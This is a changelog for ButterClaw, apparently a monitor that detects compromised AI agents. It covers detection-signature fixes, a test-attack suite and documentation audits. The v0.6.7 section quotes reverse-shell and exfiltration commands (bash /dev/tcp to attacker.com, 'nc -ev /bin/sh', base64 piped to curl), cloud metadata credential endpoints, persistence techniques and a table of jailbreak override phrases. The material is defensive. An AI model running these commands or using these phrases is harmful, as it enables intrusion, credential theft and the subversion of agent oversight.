# Changelog

All notable changes to ButterClaw are documented in this file.

Format: [Keep a Changelog](https://keepachangelog.com/)

---

## 📋 Version History

| Version | Codename | Date | Milestone |
| --- | --- | --- | --- |
| **v0.6.8** | The Arsenal Hardening | 2026-08-02 | Oopsie Logs "View All" wired up, test script rate limit, demo GIF updated|
| **v0.6.7** | The Arsenal Hardening | 2026-07-27 | Sanitizer-aware signatures, 5→7 sigs, sig_kin_01 HTML entity fix, live-fire suite |
| **v0.6.6** | The Reconciliation | 2026-07-14 | 63-point doc audit, 12-factor config, docker-compose.dev.yml critical fix |
| **v0.6.5** | The Exoskeleton Sealed | 2026-06-24 | Regex Signatures Arsenal, Paranoia Dial, TUI Dashboard, 29-vuln audit |
| **v0.6.4** | Autonomous Deployment | 2026-06-08 | One-Click Install Script |
| **v0.6.3.2** | Active Tools & Nginx Routing | 2026-05-21 | TLS routing, SSRF lockdown, active token revocation |
| **v0.6.3.1** | Deployment Packaging (Docker Edition) | 2026-05-07 | Docker bridge, Vault deadlock fix, Windows volume fixes |
| **v0.6.3** | The Exoskeleton: Deployment Packaging | 2026-05-01 | config.py, Docker, systemd, nginx, backup/restore |
| **v0.6.2** | The Exoskeleton: Alert Dispatcher | 2026-05-01 | 5 channels, 9 events, HMAC signing, brute-force detection |
| **v0.6.1** | The Exoskeleton: Policy Engine | 2026-05-01 | 3-scope pipeline, 15 operators, DRIFT pattern |
| **v0.6.0** | The Exoskeleton: API Gateway & Auth | 2026-04-20 | HMAC-SHA256, 3-tier RBAC, session tokens |
| **v0.5.2** | ButterVault OAuth | 2026-04-16 | OAuth 2.0 flows, token refresh, Gibson destroys OAuth |
| **v0.5.1** | Tool Chaining | 2026-04-16 | ChainExecutor, multi-step execution, safety rails |
| **v0.5.0** | The Nervous System | 2026-04-14 | Event Ledger, SSE Transport, MCP Manager |
| **v0.4.x** | MCP Transport Refactor | 2026-04-10 | Modular transport, JSON-RPC |
| **v0.3.x** | Routing Dashboard | 2026-04-04 | routing.html, advanced config UI |
| **v0.2.0** | ButterVault | 2026-04-01 | Encrypted credentials, Gibson Kill Switch |
| **v0.1.0** | Initial Release | 2026-03-17 | Core analysis, watcher, dashboard, MCP tools |

---

## [0.6.8] - Arsenal Hardening: Sanitizer-Aware Signatures & Live-Fire Expansion with docs & WebUI Updates - 2026-08-02

**Files Changed:** `server.py`, `default_signatures.json`, `scripts/test_attack.py`, `assets/bc_demo-small.gif`, `index.html`, `README.md`, `routing.html`, `CHANGELOG.md`
**New runtime dependencies:** 0

### Fixed
- **Oopsie Logs — "View All" button now functional** (`index.html`)
  - Button was a visual stub with no `id` or event listener wired up; now fully implemented.
  - Clicking "View All →" expands the log container past the 400px height cap so all entries are readable.
  - Clicking "Collapse ↑" returns the container to its default height and resets scroll position to top.

  - **Oopsie Logs — `/api/logs` SQL cap raised to 40** (`server.py`)
  - Hard cap was `LIMIT 10` at ship; raised to 25 mid-session, then to 40 to cover the
    full test run: 25 test cases + 13 auditor self-audit calls = 38 entries per run.
  - 2 slots of headroom above the 38-entry ceiling.

- **Rate Limit to API requests if remote brain is used** (`scripts/test_attack.py`)
 - Added a 5-second delay, the 25-case suite will take a little over two minutes to complete now. 
 - This stretches the execution window wide enough that the rolling 60-second limit will never exceed 12 requests, keeping you safely under Google's 15 RPM (free tier API) ceiling.
 - Note: Remove rate limit line from test when running locally.

- **Updated gif demo in assets folder** (`assets/bc_demo-small.gif`)
 - Now test demo reflects updated set of 7 known regex signatures from previous 5.

 ### Changed
 - **Version Bump** (`routing.html`)

---

## [0.6.7] - Arsenal Hardening: Sanitizer-Aware Signatures & Live-Fire Expansion - 2026-07-27

**Files changed:** `default_signatures.json`, `scripts/test_attack.py`
**New runtime dependencies:** 0

---

### scripts/test_attack.py — Live-Fire Suite Expansion

#### Changed

- **`scripts/test_attack.py` Rebuilt as Full Multi-Signature Test Suite:**
  The prior `test_attack.py` fired a single hardcoded payload against a single endpoint.
  It provided no coverage for individual signatures, no pass/fail differentiation per
  signature, and no mechanism to verify the two new signatures added alongside this
  release. The script has been rebuilt as a structured test suite covering all 7 Arsenal
  signatures.

  **New structure:**
  - 23 named test payloads grouped by signature ID. Each payload is labelled with the
    specific attack variant it targets (e.g., `"wss:// pivot to 192.168.x internal
    service"`, `"AWS IMDSv2 token PUT in tool args"`, `"useradd new admin user"`).
  - `pre_brain` payloads simulate sanitized watcher log lines — characters stripped by
    `watcher.py`'s `sanitize_log_line()` are pre-removed so tests match real engine input.
  - `pre_tool` payloads (for `sig_exfil_03`) use `json.dumps(tool_args)` format to
    simulate the unsanitized payload the policy engine receives from MCP tool calls.
  - Pass/fail logic inverted correctly: a non-2xx HTTP response means the Arsenal fired
    (test **pass**); a 200 OK means the signature did not trigger (test **fail**).
  - API key read from `sys.argv[1]` or falls back to `BUTTERCLAW_API_KEY` environment
    variable. Safe for CI pipelines — key is truncated in console output.
  - Per-signature grouping headers in output with `◀ NEW` marker on `sig_exfil_03` and
    `sig_kin_02` entries. Final summary line: `X/N passed | Y failed | Z connection
    errors`.
  - `sys.exit(1)` on any failure or connection error — integrates cleanly with shell
    scripts and CI exit-code checks.
  - Connection error path explicitly advises `docker compose up -d` so operators get an
    actionable message rather than a raw exception trace.

  Script remains stdlib-only (`urllib`, `json`, `sys`). No new pip dependencies.

---

### default_signatures.json — Sanitizer-Aware Signature Rebuild

#### Fixed

- **`sig_kin_01` — HTML Entity Bug: Reverse Shell Branch Was a Silent No-Op (Critical):**
  The reverse shell detection regex contained the literal string `&gt;&amp;` where the
  raw characters `>&` were required. This is an HTML entity encoding artifact — the
  pattern was authored or copied from a rendered HTML source (a tutorial, GitHub README,
  or StackOverflow page) that had already encoded `>&` as HTML entities. The JSON file
  stored the entity-encoded string; the regex engine matched it literally. The reverse
  shell branch of ButterClaw's most kinetically critical signature (`SIGKILL` response)
  has never matched a real log line since it was introduced in v0.6.5.

  Root cause of the original `>&` approach: the pattern attempted to match
  `bash -i >& /dev/tcp/` as written in shell. This was doubly broken — not only were
  the entities wrong, but `>` is stripped by `watcher.py`'s `sanitize_log_line()` before
  the payload reaches the Arsenal engine (see Architecture Notes below). Even a correctly
  encoded `>&` would never survive to match.

  **Fix:** Detection anchored on `/dev/tcp/` and `/dev/udp/` path prefixes, which survive
  the sanitizer intact and are the definitive, unambiguous indicators of a bash TCP/UDP
  redirect reverse shell regardless of how the preceding redirect operator is encoded or
  stripped. `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` arrives in the engine as
  `bash -i   /dev/tcp/10.0.0.1/4444 0 1` after sanitization — the path anchor fires
  correctly.

- **`sig_kin_01` — Hostname Support Missing from `/dev/tcp|udp/` Pattern:**
  The original path pattern used `[\d.a-fA-F:]+` as the host segment, matching only
  IP addresses and IPv6 hex notation. A reverse shell connecting to a domain name
  (e.g., `/dev/tcp/attacker.com/4444`) was not caught.
  **Fix:** Changed to `[^\s/]+` — any non-whitespace, non-slash sequence — which catches
  both bare IPs and domain names.

- **`sig_kin_01` — `nc` Combined Flag Cluster Not Matched:**
  The netcat pattern required `-e` as a standalone flag with whitespace immediately
  following. The common variant `nc -ev /bin/sh` (where `-e` and `v` are combined into
  a single flag cluster) was not matched.
  **Fix:** Changed `-e\s+` to `-[a-zA-Z]*e[a-zA-Z]*\s+`, which catches `-e`, `-ev`,
  `-elp`, and any other flag cluster containing `-e`.

- **`sig_cswh_01` — Encrypted WebSocket (`wss://`) Not Detected:**
  The CSWH signature matched only the `ws://` scheme. A Cross-Site WebSocket Hijacking
  attack pivoting to an internal service over TLS (`wss://`) was entirely invisible to
  the Arsenal. `wss://` is the more common scheme in production deployments.
  **Fix:** Changed `ws:` to `wss?:` to match both `ws://` and `wss://`.

- **`sig_cswh_01` — IPv6 Loopback (`::1`) Not in Private Range List:**
  The private address allowlist covered `127.0.0.1`, `localhost`, RFC-1918 ranges, and
  the `172.16.0.0/12` block. The IPv6 loopback address `::1` was absent.
  **Fix:** Added `::1` as a named alternative in the host segment group.

- **`sig_exfil_01` — `$` Dependency Broken by Sanitizer:**
  The credential variable patterns matched `$AWS_ACCESS_KEY_ID`, `$OPENAI_API_KEY`, etc.
  `watcher.py`'s `sanitize_log_line()` strips `$` before the payload reaches the Arsenal
  engine, replacing it with a space. The variable name patterns were therefore matching
  a string that could never appear in engine input. All credential branches were silent
  no-ops on the watcher path.
  **Fix:** All `$VAR` patterns converted to bare `VAR_NAME` matches. The sanitizer
  produces `AWS_ACCESS_KEY_ID` from `$AWS_ACCESS_KEY_ID` — bare name matching is both
  correct and sanitizer-transparent.

- **`sig_exfil_02` — Pipe Dependency Broken by Sanitizer:**
  The base64 exfiltration pipeline pattern required a literal `|` pipe character between
  `base64` and the transmission tool. `watcher.py` strips `|` before the payload reaches
  the engine, replacing it with a space. `cat /etc/passwd | base64 | curl` arrives as
  `cat /etc/passwd  base64  curl` — the pipe-dependent pattern never fired.
  **Fix:** Rebuilt as a bidirectional proximity match: `base64` within 200 characters
  of any transmission tool, or a transmission tool within 200 characters of `base64`.
  No pipe character required. The space-separated form produced by the sanitizer is
  caught correctly.

#### Changed

- **`sig_exfil_01` — Expanded Tool Coverage and Raw Token Matching:**
  The original signature covered only `curl` and `wget`. Added: `python3 -c`,
  `requests.get/post/put`, `httpx.get/post/put`, `urllib`. Added credential targets:
  `GITHUB_TOKEN`, `STRIPE_SECRET`, `DATABASE_URL`, `SECRET_KEY`, `PRIVATE_KEY`, `.env`.
  Added raw token value matching (independent of network tool co-occurrence):
  - AWS access key: `AKIA` prefix + 16 Base32 characters (`[A-Z2-7]{16}`)
  - OpenAI/Anthropic `sk-` token: 20+ alphanumeric characters (length floor prevents
    matching short task IDs that share the `sk-` prefix)
  - JWT bearer token: three Base64url segments (`eyJ…` header form)

- **`sig_exfil_02` — Expanded Tool Coverage:**
  Added `socat`, `httpx`, `requests` to the transmission tool list alongside the
  existing `curl`, `wget`, `nc`, `python3`.

- **`sig_inj_01` — Expanded from 4 Phrases to 15 Pattern Branches (5 Jailbreak Families):**
  The original 4-phrase set covered only the most widely known jailbreak opener. Any
  attacker aware of signature-based defenses avoids the exact phrases being matched.
  Expanded to 15 branches across 5 jailbreak families:

  | Family | Branches |
  |---|---|
  | Ignore-previous-instructions | `ignore (all) (your) (previous\|prior\|above\|earlier\|initial\|system) (instructions\|prompts\|rules\|constraints\|guidelines)` |
  | Persona reassignment | `you are now (a\|an\|the\|my) <word>`, `act as (a\|an\|the\|my\|if) <word>`, `pretend (you are\|to be) <word>` |
  | Mode unlock | `DAN mode`, `developer mode`, `unrestricted mode`, `sudo mode`, `god mode`, `jailbreak`, `new persona` |
  | Override / forget | `override (your) (instructions\|system\|constraints\|safety\|programming)`, `forget (all) (your) (previous\|prior\|earlier) (instructions\|training\|rules\|guidelines)`, `disregard (your\|all\|the) (previous\|prior\|system\|original\|safety) <word>` |
  | Simulate-unrestricted | `simulate (no restrictions\|having no filter\|being (unrestricted\|unfiltered\|evil\|harmful))`, `your true (self\|purpose\|nature)`, `from now on you (are\|will\|must)` |

  False-positive guards validated: `"please summarize the previous instructions in this
  document"`, `"the agent acts as a coordinator"`, `"it can act as both a filter and a
  router"` — all pass without triggering.

#### Added

- **`sig_exfil_03` — Cloud Metadata Service Probe (NEW — CRITICAL / SIGKILL / `pre_tool`):**
  Cloud instance metadata services expose live IAM credentials, user-data initialization
  scripts, and instance identity documents to any process that can issue an HTTP request
  to their link-local address. There is no legitimate operational reason for a monitored
  agent to query these endpoints directly. Agents that do so are either compromised or
  executing a privilege escalation attempt.

  Applies at `pre_tool` scope: the policy engine matches against `json.dumps(tool_args)`
  before the tool call is executed. Tool args are not sanitized — raw URLs are present
  and matchable. Triggering this signature fires `SIGKILL` immediately.

  Covered endpoints:
  - `169.254.169.254` — AWS IMDSv1, AWS IMDSv2, Azure IMDS, Oracle Cloud IMDS
    (all share this link-local address)
  - `fd00:ec2::254` — AWS IMDSv2 IPv6
  - `169.254.170.2` — Amazon ECS credential endpoint (Task IAM role credentials)
  - `metadata.google.internal` — GCP Compute Engine metadata server
  - `instance-data.ec2.internal` — Amazon DNS alias for the IMDS endpoint

- **`sig_kin_02` — Persistence Mechanism Injection (NEW — CRITICAL / SIGKILL / `pre_brain`):**
  Post-initial-access persistence is the second stage of most agent compromise scenarios.
  An agent that has executed an arbitrary command or been redirected via prompt injection
  will attempt to establish persistence before the operator can respond. Detects the
  most common persistence establishment methods available to a compromised Linux agent.

  Sanitizer note: `>>` (append redirect) is stripped by `watcher.py` before the payload
  reaches the engine. Detection anchors on the destination path or command name — the
  write operator's presence is implied, not required.

  Covered techniques:
  - **SSH `authorized_keys`:** `.ssh/authorized_keys` path presence. Catching the path
    is sufficient — the `>>` append operator that precedes it is stripped by the sanitizer.
  - **Cron injection:** `/etc/crontab`, `/etc/cron.d/` path targets; `crontab -e` command.
  - **systemd service installation:** `systemctl enable <name>.service`,
    `systemctl daemon-reload <name>.service`, `/etc/systemd/system/<name>.service` path.
  - **User account manipulation:** `useradd` with any argument (any new account creation
    is suspicious in an agent context); `usermod -[aAGsuU]` (append group, set groups,
    set shell, set UID, unlock account); `chsh -s` (shell reassignment).
  - **Critical file modification:** `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`,
    `/etc/hosts.allow`, `/etc/rc.local`.

  Negatives confirmed safe: `ssh -i keyfile user@host` (connect, not write),
  `crontab -l` (list, not edit), `cat /etc/hosts` (read, not modify),
  `cat /etc/hostname` (read, not modify).

### docs/ARCHITECTURE.md — Dual-Hemisphere Reasoning & Behavioral Drift Tracking

#### Changed

- **Dual-Hemisphere Reasoning formally documented:** Two new sections added defining the
  Guardian Brain / Auditor split that the tagline references. The Guardian Brain
  (`ask_guardian_agent()`, temperature `0.3`) fires on every cleared payload with an
  action mandate. The Auditor (`run_self_audit()`, temperature `0.0`) fires 30 seconds
  after every CRITICAL verdict with a skepticism mandate — `audit_verdict: AGREEMENT |
  FALSE_POSITIVE`. Neither is a vague metaphor: both map to named functions in `server.py`
  with documented temperatures, system prompt mandates, output schemas, and explicit
  non-powers (the Auditor cannot reverse kinetic actions automatically). Comparison table
  added. Design Decision D-08 added with rationale for why two calls outperform one.

- **Behavioral Drift Tracking formally documented:** New section added defining the
  sliding window mechanism the tagline references. On every `ask_guardian_agent()` and
  `run_self_audit()` call, `ledger_query(limit=5, status="success")` fetches the 5 most
  recent successful MCP tool calls and injects them as `timeline_context` into both LLM
  prompts. This gives both hemispheres trajectory — a single `http_get` reads differently
  adjacent to `base64` + `socat`. Scope and limitations table added explicitly stating
  what drift tracking is not: no computed baseline, no drift score, no statistical
  anomaly detection. Design Decision D-09 added documenting the choice of window size
  and success-only filter.

- **Source Code Map updated:** `run_self_audit()` added to `server.py` row's Key Entry
  Points column.

#### Architecture Notes

**Sanitizer Interaction — Why This Audit Mattered:**

`watcher.py`'s `sanitize_log_line()` strips the following characters before the log
payload reaches `policy_engine.py`'s Arsenal scan: `$ \` { } < > | ; !`

This stripping was introduced as a targeted blacklist to prevent log injection attacks
(System Invariant I-09: the sanitizer is a targeted blacklist, not an aggressive
allowlist). It is the correct design. However, three of the five v0.6.5 signatures
depended on characters in that strip list, making them partially or fully non-functional
on the watcher path from day one.

| # | Signature | Character Dependency | Sanitizer Strips? | Impact |
|---|---|---|---|---|
| 1 | `sig_kin_01` | `>` in `>&` redirect operator | ✅ Yes | Reverse shell `>&` branch: silent no-op |
| 2 | `sig_kin_01` | `&gt;&amp;` HTML entities | N/A (wrong chars) | Silent no-op regardless of sanitizer |
| 3 | `sig_exfil_01` | `$` in `$AWS_ACCESS_KEY_ID` | ✅ Yes | All variable-name branches: silent no-ops |
| 4 | `sig_exfil_02` | `\|` pipe between tools | ✅ Yes | Entire signature: silent no-op on watcher path |
| 5 | `sig_cswh_01` | None | — | Functional; only `wss://` coverage missing |
| 6 | `sig_inj_01` | None | — | Functional; only phrase coverage was narrow |

`sig_exfil_03` (`pre_tool`) and `sig_kin_02` (`pre_brain`) are both written
sanitizer-aware from introduction. `pre_tool` payloads skip sanitization entirely —
`sig_exfil_03` matches raw JSON tool args.

**Validation:** All 7 signatures validated against 74 positive and negative test cases
in a Python harness running `re.compile(pattern, re.IGNORECASE)` and `re.search()` —
the exact call signature used by `policy_engine.py`. All 74 tests pass.

---

## [0.6.6] - The Reconciliation: Documentation Audit & 12-Factor Config - 2026-07-09

**Files changed:** `.env.example`, `auth.py`, `config.py`, `docker-compose.dev.yml`,
`docs/API.md`, `docs/ARCHITECTURE.md`, `docs/DEPLOYMENT.md`, `docs/SECURITY.md`,
`CONTRIBUTING.md`, `GOVERNANCE.md`, `CHANGELOG.md`, `README.md`
**New files:** `docs/THREAT_MODEL.md`
**New runtime dependencies:** 0
**New capabilities:** 0 — this release makes the existing system trustworthy to read about.

---

### 12-Factor Config: AUTH_RATE_INFRASTRUCTURE

#### Added

- **`AUTH_RATE_INFRASTRUCTURE` Config Field (`config.py`):** The infrastructure role
  rate limit was hardcoded as `1000` directly in `auth.py`, making it invisible to the
  configuration layer and unoverridable without a code change. This violated the
  12-Factor methodology applied consistently across every other rate limit in the
  Exoskeleton. Four touch points updated in `config.py` to bring it into the config
  system:

  1. `__init__` — `self.AUTH_RATE_INFRASTRUCTURE = _env_int("RATE_INFRASTRUCTURE", 1000)`
     added to the Auth category, adjacent to `AUTH_RATE_ADMIN`, `AUTH_RATE_OPERATOR`,
     and `AUTH_RATE_VIEWER`.
  2. `_validate()` — `("AUTH_RATE_INFRASTRUCTURE", self.AUTH_RATE_INFRASTRUCTURE)` added
     to the rate limit validation loop. A `WARNING` log is emitted if the value is set
     below 500 — values in this range risk starving the Watcher daemon under load.
  3. `to_dict()` — `"infrastructure": self.AUTH_RATE_INFRASTRUCTURE` added to the
     `auth.rate_limits` dict, making it visible via `GET /api/config` (secrets redacted).
  4. `to_flat_dict()` — `"AUTH_RATE_INFRASTRUCTURE": self.AUTH_RATE_INFRASTRUCTURE` added
     adjacent to the other rate limit fields.

  Naming follows the established env var pattern: `BUTTERCLAW_` prefix + key string
  `RATE_INFRASTRUCTURE` → env var `BUTTERCLAW_RATE_INFRASTRUCTURE`. The Python attribute
  is `cfg.AUTH_RATE_INFRASTRUCTURE`, consistent with `cfg.AUTH_RATE_ADMIN` etc.

- **`AUTH_RATE_INFRASTRUCTURE` Diagnostic Test (`config.py` `__main__`):** Test 9
  (rate limit positive assertion) updated to include `AUTH_RATE_INFRASTRUCTURE`.
  `expected_keys` list in Test 14 updated to include `AUTH_RATE_INFRASTRUCTURE`. Total
  config diagnostic test count unchanged at 21 — existing tests expanded in scope.

#### Changed

- **`ROLE_RATE_LIMITS` Hardcode Removed (`auth.py`):** The infrastructure rate limit
  entry in `ROLE_RATE_LIMITS` updated to read from `config.py` instead of a hardcoded
  constant. The `getattr` fallback to `1000` preserves backward compatibility for any
  deployment that does not yet have `BUTTERCLAW_RATE_INFRASTRUCTURE` in its `.env` file.
  No crash on startup with an older config.

---

### Documentation Audit: docker-compose.dev.yml, CONTRIBUTING.md, GOVERNANCE.md

#### Fixed

- **Dev Compose Service Name Mismatch — `docker-compose.dev.yml` (Critical):**
  The dev override file defined the application service as `butterclaw`. The production
  `docker-compose.yml` defines it as `butterclaw-server`. Docker Compose merges override
  files by service name — a name mismatch means the override is never applied. Running
  the dev stack spawned a second orphan container named `butterclaw` alongside the
  unmodified production `butterclaw-server`, with both competing for the same internal
  ports. Hot-reload via the `./:/app` volume mount never applied to the actual running
  service. Service name corrected to `butterclaw-server` in the dev override file.

- **`ntfy` Service Not Suppressed in Dev Override — `docker-compose.dev.yml`:**
  The dev override suppressed `nginx` via `profiles: [production]` but did not suppress
  `butterclaw-ntfy`. In dev mode, ntfy spun up unnecessarily on every `docker compose up`.
  `profiles: [production]` added to the `butterclaw-ntfy` service block in the dev
  override.

- **`BUTTERCLAW_API_KEY` Missing from Dev Override — `docker-compose.dev.yml`:**
  The infrastructure role bootstraps from the `BUTTERCLAW_API_KEY` environment variable
  at startup via `bootstrap_infrastructure_keys_auto_heal()`. This variable was absent
  from the dev override's environment block, causing cold-start failures in dev mode
  with a blank database. Added with a safe default fallback:
  `BUTTERCLAW_API_KEY=${BUTTERCLAW_API_KEY:-dev-bootstrap-key-change-me}`.

- **`version: '3.8'` Deprecated Key — `docker-compose.dev.yml`:**
  The top-level `version` key is ignored and deprecated in Docker Compose v2, generating
  a warning on every `docker compose up`. Removed.

- **AAIF Status Tense Inconsistency — `GOVERNANCE.md`:**
  `GOVERNANCE.md` stated "As a Growth-stage project..." implying AAIF membership is
  confirmed. `README.md` correctly states "applying for AAIF Growth Stage." GOVERNANCE.md
  corrected to "As a project applying for AAIF Growth Stage membership."

#### Changed

- **`CONTRIBUTING.md` Expanded to Cover Full Exoskeleton Surface:**
  The prior `CONTRIBUTING.md` described only three contribution areas. The entire
  v0.6.x Exoskeleton — Policy Engine, Alert Dispatcher, Auth/RBAC, MCP Transport,
  TUI Dashboard, Config & Deployment, Documentation, Integration Testing — was entirely
  absent. A full contribution surface table (10 rows) added covering every layer.

- **Development Setup Section Added — `CONTRIBUTING.md`:**
  No setup instructions existed. New section covers: Python 3.11+, `pip install
  -r requirements.txt`, two-step Ollama model setup, `.env.example` copy, and the dev
  Docker Compose workflow.

- **Diagnostic Test Suites Documented — `CONTRIBUTING.md`:**
  The 4 module diagnostic suites (61 tests total) were entirely absent from the
  contributor guide. Updated PR process now explicitly requires all 61 tests to pass,
  documents each suite's command and test count, and instructs contributors to add
  tests to the `__main__` block of any module they extend.

- **Live Fire Testing Scripts Documented — `CONTRIBUTING.md`:**
  `scripts/add_rule.py` and `scripts/test_attack.py` added with usage commands.

- **Documentation Update Requirement Added to PR Process — `CONTRIBUTING.md`:**
  Step 5 added: changes affecting any public surface must update the relevant file
  in `docs/`.

- **Architectural Decision Process Documented — `GOVERNANCE.md`:**
  Major changes require a GitHub Issue first; security-sensitive changes require explicit
  Lead Maintainer approval and bypass the 72-hour lazy consensus window.

- **Security Disclosure Section Added — `GOVERNANCE.md`:**
  Directs reporters to GitHub Private Vulnerability Reporting and links to `SECURITY.md`.

- **Co-Maintainer Needs Table Added — `GOVERNANCE.md`:**
  Three active co-maintainer needs (MCP Transport, Security Research, Documentation)
  documented as a structured table.

- **Header Comment Updated — `docker-compose.dev.yml`:**
  Version string updated from v0.6.3 to v0.6.5. Ollama bridging note added explaining
  `host.docker.internal` (Windows/macOS) vs `172.17.0.1` (Linux).

#### Architecture Notes

**Complete Findings Table:**

| # | File | Finding | Severity |
|---|---|---|---|
| 1 | `docker-compose.dev.yml` | Service name `butterclaw` → `butterclaw-server` — override never applied | 🔴 Critical |
| 2 | `docker-compose.dev.yml` | `butterclaw-ntfy` not suppressed in dev mode | 🟡 Functional |
| 3 | `docker-compose.dev.yml` | `BUTTERCLAW_API_KEY` missing — infrastructure bootstrap fails on cold start | 🟡 Functional |
| 4 | `docker-compose.dev.yml` | `version: '3.8'` deprecated in Compose v2 | 🟡 Functional |
| 5 | `docker-compose.dev.yml` | Header version stale (v0.6.3) | 🟢 Cosmetic |
| 6 | `docker-compose.dev.yml` | No Linux Ollama bridge note | 🟢 Cosmetic |
| 7 | `CONTRIBUTING.md` | Entire Exoskeleton contribution surface absent | 🟡 Gap |
| 8 | `CONTRIBUTING.md` | No development setup section | 🟡 Gap |
| 9 | `CONTRIBUTING.md` | 4 diagnostic suites (61 tests) never mentioned | 🟡 Gap |
| 10 | `CONTRIBUTING.md` | Live fire scripts not mentioned | 🟢 Gap |
| 11 | `CONTRIBUTING.md` | No docs update requirement in PR process | 🟢 Gap |
| 12 | `GOVERNANCE.md` | AAIF status tense inconsistency vs README | 🟡 Factual |
| 13 | `GOVERNANCE.md` | No architectural decision process documented | 🟢 Gap |
| 14 | `GOVERNANCE.md` | Security disclosure section absent | 🟢 Gap |

**No code changes in this section.** All modifications are documentation-only.

---

### Documentation Audit: README.md & .env.example

#### Fixed

- **Route Count (`README.md`):** Four occurrences of the incorrect route count corrected
  to **49**. The parenthetical note claiming routes were "reduced to 43 to account for
  shared endpoints" removed — Flask treats different HTTP methods on the same path as
  distinct routes.

- **3-Tier → 4-Tier RBAC (`README.md`):** Four occurrences corrected across the role
  table, Security Architecture table, ASI-02 mitigation description, and Roadmap table.

- **16 Operators → 15 (`README.md`):** Three occurrences corrected. Verified by direct
  count of the `policy_engine.py` dispatch table.

- **5 Channels → 6 (`README.md`):** Five occurrences corrected. Telegram row added to
  the channel table — existed in the What's New section as a v0.6.5 community
  contribution but was absent from the reference table.

- **ASI-08 Missing (`README.md`):** OWASP ASI coverage table skipped ASI-08 (Insecure
  Output Handling). ButterClaw has mitigated ASI-08 since `post_brain` was introduced
  in v0.6.1. Entry added.

- **Docker Table Shows `ollama` Container (`README.md`):** Table corrected to show
  actual container names: `butterclaw-server`, `butterclaw-ntfy` (port 2586), nginx.
  Ollama runs on the host directly, not as a managed Docker service.

- **`ollama pull Modelfile.example` Broken Instruction (`README.md`, `.env.example`):**
  Corrected in all three locations to the two-step workflow: `ollama pull gemma4:e4b`
  then `ollama create butterclaw-optimized -f Modelfile.example`.

- **`git checkout dev` in Quick Start (`README.md`):** Both occurrences removed.
  Production branch is `main`.

- **v0.6.5 Missing from Version History (`README.md`):** Row added: "The Exoskeleton
  Sealed", 2026-06-24.

- **Component Map Line Counts Wrong (`README.md`):** All 10 entries corrected against
  direct source reads. `tui_dashboard.py` row added (~350 lines).

- **Alert Event Type Name Strings Wrong (`README.md`):** All 9 event type strings
  corrected against `alert_dispatcher.py` registry.

- **Project Structure Tree Incomplete (`README.md`):** Five missing files added:
  `nginx/default.conf`, `scripts/add_rule.py`, `scripts/test_attack.py`,
  `default_signatures.json`, `Modelfile.example`.

#### Changed

- **`BUTTERCLAW_RATE_INFRASTRUCTURE` Added (`.env.example`):** Field and comment added
  for the infrastructure role rate limit (1000 req/min, machine-to-machine).

- **`infrastructure` Role Added to Auth Section (`README.md`):** Role table expanded
  from 3 to 4 rows. Privilege -1 documented, internal-only callout added.

**No code changes in this section.** All modifications are documentation-only.

---

### Documentation Audit: SECURITY.md & DEPLOYMENT.md

#### Fixed

- **ASI-08 Entry Missing (`docs/SECURITY.md`):** OWASP ASI mapping table skipped from
  ASI-07 to ASI-09. ButterClaw has mitigated ASI-08 since the `post_brain` policy scope
  was introduced in v0.6.1. Entry added. ASI coverage count corrected to **10**.

- **3-Tier → 4-Tier RBAC (`docs/SECURITY.md`):** Two occurrences corrected — Base
  Security Mechanisms table and ASI-02 mitigation description.

- **5 Channels → 6 (`docs/SECURITY.md`):** Alerting row corrected to include all 6
  channels with names listed.

- **Container Security Row Expanded (`docs/SECURITY.md`):** Full set of active systemd
  hardening directives documented: `ProtectSystem=strict`, `NoNewPrivileges=true`,
  `ProtectHome=true`, `PrivateTmp=true`.

- **Broken Ollama Instruction (`docs/DEPLOYMENT.md`):** `ollama pull Modelfile.example`
  is not a valid Ollama command. Corrected to two-step workflow. Modelfile parameters
  table added inline.

- **Non-Existent `watcher.service` Reference (`docs/DEPLOYMENT.md`):** `systemd/`
  contains only `butterclaw.service`. Section now documents the actual state, provides
  a workaround (`screen`/`tmux`), and notes a dedicated unit is planned.

- **Wrong nginx Config Filename (`docs/DEPLOYMENT.md`):** All references to
  `nginx/nginx.conf` corrected to `nginx/butterclaw.conf` and `nginx/default.conf`.

- **CSP Header Claim Removed (`docs/SECURITY.md`):** No `Content-Security-Policy`
  header is present in `nginx/butterclaw.conf`. Note added: planned for v0.7.0.

#### Changed

- **Backup Scope Documented (`docs/DEPLOYMENT.md`):** Full inclusion/exclusion table
  added. Critical warning added: the OS keyring entry holding the ButterVault master
  key cannot be backed up by the script — loss means permanent vault data loss.

- **`butterclaw-ntfy` Documented (`docs/DEPLOYMENT.md`):** Container name, port 2586,
  CLI subscribe command, and web UI access documented for the first time.

- **`ReadWritePaths` Gap Disclosed (`docs/DEPLOYMENT.md`):** `retry_queue.json` and
  `watcher.pid` will fail to write under `ProtectSystem=strict`. Gap documented with
  corrected `ReadWritePaths` line provided inline.

- **Auth Gateway Diagnostics Expanded (`docs/DEPLOYMENT.md`):** `infrastructure` role
  documented explicitly with recovery path after Gibson sequence.

#### Architecture Notes

**Complete Findings Table — SECURITY.md & DEPLOYMENT.md Audit:**

| # | File | Claim | Was | Is | Verified Against |
|---|---|---|---|---|---|
| 1 | `SECURITY.md` | RBAC tier count (Authorization row) | 3-tier | 4-tier | `ROLE_HIERARCHY` in `auth.py` |
| 2 | `SECURITY.md` | RBAC tier count (ASI-02) | 3-tier | 4-tier | `ROLE_HIERARCHY` in `auth.py` |
| 3 | `SECURITY.md` | Alert channel count | 5 | 6 | `alert_dispatcher.py` channel registry |
| 4 | `SECURITY.md` | ASI-08 entry | Missing | Documented | `post_brain` scope in `server.py` |
| 5 | `SECURITY.md` | Container hardening directives | 1 directive | All 4 | `systemd/butterclaw.service` |
| 6 | `SECURITY.md` | CSP header | Implied present | Not in conf | `nginx/butterclaw.conf` direct read |
| 7 | `DEPLOYMENT.md` | Ollama setup command | `ollama pull Modelfile.example` | 2-step | `Modelfile.example` + Ollama CLI |
| 8 | `DEPLOYMENT.md` | `watcher.service` exists | Referenced as existing | Does not exist | `systemd/` directory listing |
| 9 | `DEPLOYMENT.md` | nginx config filename | `nginx/nginx.conf` | `nginx/butterclaw.conf` + `nginx/default.conf` | `nginx/` directory listing |
| 10 | `DEPLOYMENT.md` | ntfy container | Undocumented | `butterclaw-ntfy` port 2586 | `docker-compose.yml` |
| 11 | `DEPLOYMENT.md` | Backup scope | Undocumented | Table with OS keyring warning | `scripts/backup.sh` direct read |
| 12 | `DEPLOYMENT.md` | `ReadWritePaths` coverage | Undisclosed gap | Gap documented with fix | `systemd/butterclaw.service` |

